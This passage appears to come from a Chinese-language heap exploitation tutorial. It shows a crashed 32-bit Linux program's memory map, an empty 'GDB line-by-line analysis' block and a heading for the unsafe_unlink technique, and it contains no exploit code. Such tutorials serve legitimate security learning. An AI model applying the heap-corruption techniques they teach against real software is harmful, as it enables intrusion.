f7f83000-f7fa6000 r-xp 00000000 08:01 1835267                            /lib/i386-linux-gnu/ld-2.23.so
f7fa6000-f7fa7000 r--p 00022000 08:01 1835267                            /lib/i386-linux-gnu/ld-2.23.so
f7fa7000-f7fa8000 rw-p 00023000 08:01 1835267                            /lib/i386-linux-gnu/ld-2.23.so
ff82c000-ff84d000 rw-p 00000000 00:00 0                                  [stack]
Aborted (core dumped)
```

GDB逐行分析

```

```

# 0x04 unsafe_unlink 